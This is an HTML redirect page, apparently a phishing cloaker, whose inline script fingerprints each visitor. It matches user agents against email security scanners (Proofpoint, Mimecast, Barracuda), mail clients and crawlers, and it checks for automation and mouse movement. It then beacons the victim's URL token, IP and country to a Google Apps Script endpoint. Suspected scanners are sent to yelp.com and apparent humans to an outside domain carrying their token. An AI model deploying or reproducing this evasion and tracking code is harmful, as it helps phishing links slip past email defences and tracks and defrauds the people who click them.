<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <style>
    .loader {
      width: 48px;
      height: 48px;
      border: 5px solid #FFF;
      border-bottom-color: #FF3D00;
      border-radius: 50%;
      display: inline-block;
      box-sizing: border-box;
      animation: rotation 1s linear infinite;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }
    @keyframes rotation {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }
  </style>
  <script>
    window.addEventListener("load", function () {
      const hash = window.location.hash ? window.location.hash.substring(1) : null;
      const ua = navigator.userAgent || "";
      const uaClean = ua.toLowerCase().replace(/\s+/g, '');
      let isBot = false;

      // Enhanced bot detection
      const botPatterns = [
        "bot", "crawl", "spider", "slurp", "headless", "phantom",
        "facebookexternalhit", "googlebot", "bingbot", "yahoobot", "duckduckbot",
        "outlook", "thunderbird", "email", "mail", "eudora", "applemail",
        "smtp", "imap", "pop3", "scanner", "preview", "fetcher",
        "verifier", "proofpoint", "postini", "barracuda", "trendmicro",
        "mimecast", "comcast", "charter", "roadrunner", "att", "yahoo",
        "gmail", "aol", "curl", "wget", "python-requests", "axios",
        "selenium", "puppeteer", "playwright", "cypress", "nightmare"
      ];

      // Check for bot patterns
      isBot = botPatterns.some(pattern => uaClean.includes(pattern));

      // Modern bot detection methods
      const botChecks = {
        // Check for common bot behaviors
        hasWebGL: () => {
          try {
            const canvas = document.createElement('canvas');
            return !!(window.WebGLRenderingContext && 
              (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
          } catch(e) {
            return false;
          }
        },
        
        // Check for automation tools
        hasAutomation: () => {
          return navigator.webdriver || 
                 window.document.documentElement.getAttribute("webdriver") !== null ||
                 window.navigator.languages === undefined;
        },

        // Check for human-like behavior
        hasHumanBehavior: () => {
          return navigator.hardwareConcurrency > 1 && 
                 navigator.deviceMemory > 1 &&
                 screen.colorDepth >= 24;
        }
      };

      // Run additional checks
      if (!botChecks.hasWebGL() || 
          botChecks.hasAutomation() || 
          !botChecks.hasHumanBehavior()) {
        isBot = true;
      }

      // Check for JavaScript and localStorage
      try {
        localStorage.setItem("js-check", "1");
        if (localStorage.getItem("js-check") !== "1") isBot = true;
      } catch {
        isBot = true;
      }

      // Mouse movement detection with debounce
      let moved = false;
      let moveTimeout;
      window.addEventListener("mousemove", () => {
        moved = true;
        clearTimeout(moveTimeout);
        moveTimeout = setTimeout(() => {
          // Reset after 5 seconds of no movement
          moved = false;
        }, 5000);
      });

      // Handle redirects
      if (!hash) {
        window.location.href = "https://google.com";
        return;
      }

      // Analytics with retry mechanism
      const sendAnalytics = (retryCount = 0) => {
        const maxRetries = 2;
        const analyticsUrl = "https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4";
        
        fetch(analyticsUrl)
          .then(res => res.json())
          .then(data => {
            const ip = data.query || "";
            const country = data.country || "";
            const finalUrl = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
              `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
            
            const img = new Image();
            img.src = finalUrl;
          })
          .catch(() => {
            if (retryCount < maxRetries) {
              setTimeout(() => sendAnalytics(retryCount + 1), 1000);
            } else {
              // Fallback without IP data
              const img = new Image();
              img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
                `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
            }
          });
      };

      sendAnalytics();

      // Reduced timeout for better UX
      setTimeout(() => {
        if (isBot || !moved) {
          window.location.href = "https://yelp.com";
        } else {
          window.location.replace(`https://szliyi.com/${hash}`);
        }
      }, 1000); // Reduced from 2000ms to 1000ms
    });
  </script>
</head>
<body>
  <div class="loader"></div>
</body>
</html>
